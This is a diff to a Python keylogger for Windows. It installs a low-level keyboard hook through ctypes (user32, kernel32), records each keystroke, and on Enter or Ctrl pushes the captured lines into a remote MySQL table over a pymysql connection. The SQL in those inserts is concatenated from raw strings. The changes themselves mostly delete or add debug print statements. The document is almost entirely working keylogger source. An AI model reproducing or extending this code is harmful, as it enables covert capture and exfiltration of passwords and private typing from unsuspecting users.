@@ -16,7 +16,6 @@ connect = pymysql.Connect(
 )
 # 获取游标
 cursor = connect.cursor()
-
 user32 = windll.user32
 kernel32 = windll.kernel32
 
@@ -50,6 +49,7 @@ class KeyLogger:
 
 def getFPTR(fn):
     CMPFUNC = CFUNCTYPE(c_int,c_int,c_int,POINTER(c_void_p))
+    print(CMPFUNC(fn))
     return CMPFUNC(fn)
 
 def hookProc(nCode,wParam,lParam):
@@ -57,19 +57,16 @@ def hookProc(nCode,wParam,lParam):
         return user32.CallNextHookEx(keyLogger.hooked,nCode,wParam,lParam)
     hookedKey = chr(0xffffffff&lParam[0])
     RecordLine.append(hookedKey)
-    print(hookedKey,0xffffffff&lParam[0])
     if int(0xffffffff & lParam[0]) == ENTER_CODE:
         UploadLine = ''.join(RecordLine)
         RecordLine.clear()
         cursor.execute("insert into mysql.key_board_record values('" + UploadLine + "'," + current_date +  ")")
         connect.commit()
-        print('Upload Record')
     if int(0xffffffff&lParam[0]) == CTRL_CODE:
         UploadLine = ''.join(RecordLine)
         RecordLine.clear()
         cursor.execute("insert into mysql.key_board_record values('" + UploadLine + "'," + current_date + ")")
         connect.commit()
-        print('Ctrl Pressed,call uninstallHook()')
         keyLogger.unisallHookProc()
         cursor.close()
         connect.close()
